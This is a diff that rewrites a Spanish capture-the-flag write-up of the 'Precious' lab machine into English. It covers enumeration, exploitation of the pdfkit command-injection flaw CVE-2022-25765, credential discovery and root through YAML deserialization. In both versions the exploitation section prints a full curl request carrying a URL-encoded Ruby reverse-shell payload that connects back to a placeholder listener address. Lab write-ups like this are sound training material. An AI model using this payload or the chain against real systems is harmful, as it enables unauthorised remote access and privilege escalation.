@@ -7,6 +7,85 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>Precious</h1><br/><p>Enumeración de puertos</p><p>  <strong> nmap -sV -sC -p- --open 10.10.11.189 -T4 -A -vv -oN scan.txt</strong></p><p></p><p>Encuentro los servicios <strong>ssh</strong> y <strong>http</strong></p><p></p><p>Añado la IP a <strong>/etc/hosts</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong>A simple vista le pasamos una url y la convierte en pdf</p><p>   <img src="images/88-1.png" alt="images/88-1.png" /></p><p></p><p>Hago una enumeración de endpoints con gobuster</p><p>  <strong> gobuster dir -u </strong><strong><a href="http://precious.htb/">http://precious.htb/</a></strong><strong> -w /usr/share/wordlists/dirb/big.txt</strong></p><p></p><p>Intercepto la solicitud con Burpsuite</p><p></p><p>Me devuelve que no puede ser una URL remota por lo que creo un servidor local con httpserver para que me genere el pdf</p><p></p><p>Veo que me crea el pdf</p><p>   <img src="images/88-2.png" alt="images/88-2.png" /></p><p></p><p>Miro si realmente me descargó un archivo pdf con exiftool. Al analizar los metadatos me da algo que considero importante</p><p></p><p>Me da una versión de la herramienta que se usó para crear el pdf</p><p>   <img src="images/88-3.png" alt="images/88-3.png" /></p><p></p><p>Tras buscar la versión encuentro que es vulnerable a CMD Injection <a href="https://www.cve.org/CVERecord?id=CVE-2022-25765">CVE-2022-25765</a></p><p></p><p> El espacio de nombres PdfKit proporciona funciones para leer, escribir y anotar documentos PDF</p><p></p><p>Primero tendremos que arrancar el http.server</p><p>   <img src="images/88-4.png" alt="images/88-4.png" /></p><p></p><p>Luego arrancamos el nc listener</p><p>   <img src="images/88-5.png" alt="images/88-5.png" /></p><p></p><p>Y realizamos la siguiente solicitud con curl</p><p> <strong>  curl &#39;TARGET_ADDRESS&#39; -X POST -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&#39; -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8&#39; -H &#39;Accept-Language: en-US,en;q=0.5&#39; -H &#39;Accept-Encoding: gzip, deflate&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -H &#39;Origin: TARGET_ADDRESS&#39; -H &#39;Connection: keep-alive&#39; -H &#39;Referer: TARGET_ADDRESS&#39; -H &#39;Upgrade-Insecure-Requests: 1&#39; --data-raw &#39;url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60&#39;</strong></p><p></p><p>Obtengo el reverse</p><p>   <img src="images/88-6.png" alt="images/88-6.png" /></p><p></p><p>En home encuentro un usuario lllamado henry por lo que puede que tenga que hacer lateral movement</p><p>   <img src="images/88-7.png" alt="images/88-7.png" /></p><p></p><p>La flag de user está en henry pero no tengo permisos de lectura</p><p>   <img src="images/88-8.png" alt="images/88-8.png" /></p><p></p><p>Puede que en la ruta config encuentre alguna credencial</p><p>   <img src="images/88-9.png" alt="images/88-9.png" /></p><p>   </p><p>No encuentro nada interesante</p><p>   </p><p>Tras buscar en los directorios de ruby encuentro las credenciales de henry</p><p>   <img src="images/88-10.png" alt="images/88-10.png" /></p><p>   </p><p>A través de SSH entro como el user henry y obtengo la flag de user</p><p>   <img src="images/88-11.png" alt="images/88-11.png" /></p><p>   </p><p>Con sudo -l veo que puedo ejecutar una script como root</p><p>   <img src="images/88-12.png" alt="images/88-12.png" /></p><p>   </p><p>Hago un cat al archivo para ver si encuentro algi interesante</p><p>   </p><p>usal YAML por lo que es vulnerable a ataque de deserialización YAML.</p><p>   </p><p>Esta script se usa para administrar paquetes en Ruby</p><p>   </p><p>Esta parte me interesa</p><p>   <img src="images/88-13.png" alt="images/88-13.png" /></p><p>   </p><p>Creo el archivo en <strong>/dev/shm</strong> que será el que ejecute con ruby</p><p>   <img src="images/88-14.png" alt="images/88-14.png" /></p><p>   </p><p>Creo el privesc</p><p>   <img src="images/88-15.png" alt="images/88-15.png" /></p><p>   </p><p>Ahora nos da un error , la salida del id   </p><p> <img src="images/88-16.png" alt="images/88-16.png" /></p><p>   </p><p>Se pierde el id pero encontramos una ejecución como root</p><p>   <img src="images/88-17.png" alt="images/88-17.png" /></p><p>   </p><p>Estoy dentro del grupo root con henry y accedo a root ejecutandolo con -p me dará un <strong>shell</strong> efectivo con el GID y el UID como root</p><p>   <img src="images/88-18.png" alt="images/88-18.png" /></p></div>
+<div class="page">
+
+<h1 class="title">Precious</h1>
+
+<section>
+<h2>Reconnaissance</h2>
+<p>The engagement started with a full port enumeration in order to identify exposed services on the target host.</p>
+<pre><code>nmap -sV -sC -p- --open 10.10.11.189 -T4 -A -vv -oN scan.txt</code></pre>
+<p>The scan revealed two accessible services: SSH and HTTP.</p>
+<p>The target IP was added to the <code>/etc/hosts</code> file to properly resolve the virtual host.</p>
+<p>At first glance, the web application accepts a URL as input and converts it into a PDF document.</p>
+<p><img src="images/88-1.png" alt="images/88-1.png" /></p>
+</section>
+
+<section>
+<h2>Enumeration</h2>
+<p>Endpoint enumeration was performed against the web service to identify additional attack surface.</p>
+<pre><code>gobuster dir -u http://precious.htb/ -w /usr/share/wordlists/dirb/big.txt</code></pre>
+<p>The request was intercepted using Burp Suite to better understand how the application processes input.</p>
+<p>The response indicated that remote URLs were not accepted, so a local HTTP server was created to serve content to the application.</p>
+<p>After submitting a locally hosted URL, the application successfully generated a PDF file.</p>
+<p><img src="images/88-2.png" alt="images/88-2.png" /></p>
+<p>The downloaded PDF was analyzed using exiftool to inspect its metadata.</p>
+<p>Within the metadata, the version of the tool used to generate the PDF was identified.</p>
+<p><img src="images/88-3.png" alt="images/88-3.png" /></p>
+<p>Researching this version revealed that it is vulnerable to command injection, specifically <a href="https://www.cve.org/CVERecord?id=CVE-2022-25765">CVE-2022-25765</a>.</p>
+<p>The PdfKit namespace provides functionality for reading, writing, and annotating PDF documents, and this vulnerability allows command execution during PDF generation.</p>
+</section>
+
+<section>
+<h2>Exploitation</h2>
+<p>To exploit the vulnerability, a local HTTP server was first started to host a crafted payload.</p>
+<p><img src="images/88-4.png" alt="images/88-4.png" /></p>
+<p>A Netcat listener was then launched to receive the reverse shell.</p>
+<p><img src="images/88-5.png" alt="images/88-5.png" /></p>
+<p>A malicious request was sent using curl, embedding a Ruby payload to establish a reverse shell.</p>
+<pre><code>curl 'TARGET_ADDRESS' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_ADDRESS' -H 'Connection: keep-alive' -H 'Referer: TARGET_ADDRESS' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60'</code></pre>
+<p>The reverse shell connection was successfully established.</p>
+<p><img src="images/88-6.png" alt="images/88-6.png" /></p>
+</section>
+
+<section>
+<h2>Post-Exploitation Analysis</h2>
+<p>Once inside the system, a local user named <code>henry</code> was identified, indicating the need for lateral movement.</p>
+<p><img src="images/88-7.png" alt="images/88-7.png" /></p>
+<p>The user flag was located in henry’s home directory, but it was not readable with the current privileges.</p>
+<p><img src="images/88-8.png" alt="images/88-8.png" /></p>
+<p>Configuration directories were reviewed in search of credentials.</p>
+<p><img src="images/88-9.png" alt="images/88-9.png" /></p>
+<p>No useful information was found in the initial configuration files.</p>
+<p>Further searching within Ruby-related directories revealed credentials belonging to the user <code>henry</code>.</p>
+<p><img src="images/88-10.png" alt="images/88-10.png" /></p>
+<p>Using these credentials, SSH access as <code>henry</code> was obtained, allowing retrieval of the user flag.</p>
+<p><img src="images/88-11.png" alt="images/88-11.png" /></p>
+</section>
+
+<section>
+<h2>Privilege Escalation</h2>
+<p>With access as <code>henry</code>, sudo privileges were enumerated.</p>
+<p><img src="images/88-12.png" alt="images/88-12.png" /></p>
+<p>The output showed that a Ruby script could be executed with root privileges.</p>
+<p>The script was inspected to understand its functionality.</p>
+<p>The script makes use of YAML, which introduces a potential YAML deserialization vulnerability.</p>
+<p>This script is intended for Ruby package management.</p>
+<p>A specific section of the script handling YAML input was identified as particularly interesting.</p>
+<p><img src="images/88-13.png" alt="images/88-13.png" /></p>
+<p>A malicious YAML file was created under <code>/dev/shm</code>, which would be executed by the Ruby interpreter.</p>
+<p><img src="images/88-14.png" alt="images/88-14.png" /></p>
+<p>The privilege escalation payload was crafted.</p>
+<p><img src="images/88-15.png" alt="images/88-15.png" /></p>
+<p>Executing the script initially resulted in an error, and the output of the <code>id</code> command was not fully displayed.</p>
+<p><img src="images/88-16.png" alt="images/88-16.png" /></p>
+<p>Despite the error, command execution as root was confirmed.</p>
+<p><img src="images/88-17.png" alt="images/88-17.png" /></p>
+<p>The user was now part of the root group, and by executing a shell with the <code>-p</code> option, an effective root shell was obtained with UID and GID set to root.</p>
+<p><img src="images/88-18.png" alt="images/88-18.png" /></p>
+</section>
+
+</div>
 </body>
+
 </html>
